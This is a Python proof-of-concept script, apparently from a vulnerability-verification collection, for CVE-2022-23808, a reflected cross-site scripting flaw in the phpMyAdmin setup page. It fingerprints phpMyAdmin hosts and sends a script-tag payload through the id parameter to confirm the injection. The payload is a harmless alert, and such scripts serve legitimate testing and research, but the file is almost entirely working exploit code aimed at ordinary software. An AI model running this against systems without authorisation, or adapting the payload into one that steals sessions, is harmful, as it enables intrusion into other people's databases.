import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''phpMyAdmin < 5.1.2 - XSS''',
        "description": '''An issue was discovered in phpMyAdmin 5.1 before 5.1.2. An attacker can inject malicious code into aspects of the setup script, which can allow XSS or HTML injection.''',
        "severity": "medium",
        "references": [
            "https://mp.weixin.qq.com/s/c2kwxwVUn1ym7oqv9Uio_A",
            "https://github.com/dipakpanchal456/CVE-2022-23808",
            "https://nvd.nist.gov/vuln/detail/CVE-2022-23808"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "cvss-score": "6.1",
            "cve-id": "CVE-2022-23808",
            "cwe-id": "CWE-79"
        },
        "metadata":{
            "vuln-target": "https://github.com/cckuailong/reapoc/tree/main/2022/CVE-2022-23808/vultarget"
        },
        "tags": ["phpmyadmin", "unauth" , "xss"],
    }


# Vender Fingerprint
def fingerprint(url):
    url = format_url(url)
    resp = requests.get(url, timeout=10, verify=False)
    if "<title>phpMyAdmin</title>" in resp.text or "pma_password" in resp.text or "Set-Cookie: phpMyAdmin=" in str(resp.headers) or "realm=\"phpMyAdmin" in str(resp.headers):
        return True
    else:
        return False

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = "/setup/index.php?page=servers&mode=test&id=\">'><script>alert(document.domain)</script>"
        method = "GET"
        headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36"}
        resp = requests.request(method=method,url=url+path,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if resp.status_code == 200 and 'text/html' in str(resp.headers) and "\">'><script>alert(document.domain)</script>" in resp.text:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url